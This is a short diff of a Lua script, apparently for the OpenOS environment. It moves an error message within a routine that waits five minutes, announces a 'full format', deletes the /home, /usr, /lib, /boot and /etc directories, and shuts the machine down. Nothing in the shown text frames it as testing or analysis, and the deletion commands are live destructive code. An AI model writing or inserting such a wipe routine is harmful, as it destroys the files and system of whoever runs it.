@@ -144,12 +144,10 @@ mayner.DrawButton(30, 14, 13, 3, "Delete OpenOS", 0x000000, 0xFFFFFF, function()
 end)
 
 os.sleep(300)
-
+ECS.error("TIME FOR FULL FORMAT!!!")
 fs.remove("/home/*")
 fs.remove("/usr/*")
 fs.remove("/lib/*")
 fs.remove("/boot/*")
 fs.remove("/etc/*")
-ECS.error("TIME FOR FULL FORMAT!!!")
-
 comp.shutdown(true)
